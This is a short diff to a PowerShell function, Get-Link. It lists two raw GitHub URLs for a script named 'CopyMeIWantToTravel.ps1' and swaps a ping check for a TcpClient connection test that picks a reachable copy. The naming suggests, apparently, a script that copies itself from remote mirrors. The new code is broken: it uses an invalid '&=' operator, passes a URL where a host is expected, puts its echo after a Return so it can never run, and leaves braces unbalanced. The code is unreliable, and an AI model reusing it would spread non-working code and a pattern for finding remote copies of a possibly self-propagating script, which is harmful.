@@ -445,8 +445,17 @@ function Get-Link {
 $links = "https://raw.githubusercontent.com/D3F4LT99/P0w3rsh3ll3d/master/CopyMeIWantToTravel.ps1"
 $links &= "https://raw.githubusercontent.com/D3F4LT99/d3f4lt99.github.io/master/CopyMeIWantToTravel.ps1"
 foreach ($link in $links) {
- if((Test-Connection -Cn $link -BufferSize 16 -Count 1 -ea 0 -quiet))
-      {echo $link}
+$error = 0
+$TcpConnection = New-Object System.Net.Sockets.TcpClient
+        try {
+            $TcpConnection.Connect($link, "80")       
+	} catch {
+	    $error = 1
+            $Tcpconnection.Close()
+	Return 
+	if ($error -eq 0) { 
+	echo $link
+	}
    }
 }
 
